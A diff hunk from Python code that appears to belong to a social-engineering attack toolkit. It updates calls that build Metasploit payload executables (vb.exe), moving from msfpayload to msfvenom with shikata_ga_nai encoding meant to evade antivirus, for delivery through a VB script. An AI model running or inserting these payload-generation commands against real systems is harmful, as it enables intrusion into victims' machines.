@@ -176,12 +176,12 @@ if exploit_counter == 0:
         # Creating Payload here
         # if not 64 specify raw output and filename of vb1.exe
         if noencode == 0:
-            execute1=("R")
+            execute1=("raw")
             payloadname=("vb1.exe")
         if noencode == 1:
-            execute1=("X")
+            execute1=("exe")
             payloadname=("vb.exe")
-        subprocess.Popen("ruby %s/msfpayload %s %s %s ENCODING=shikata_ga_nai %s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
+        subprocess.Popen("ruby %s/msfvenom -p %s %s %s -e shikata_ga_nai --format=%s > %s/%s" % (meta_path,payload,rhost,lport,execute1,setdir,payloadname), shell=True).wait()
         if noencode == 0:
             subprocess.Popen("ruby %s/msfencode -e x86/shikata_ga_nai -i %s/vb1.exe -o %s/vb.exe -t exe -c 3" % (meta_path,setdir,setdir), shell=True).wait()
         # Create the VB script here
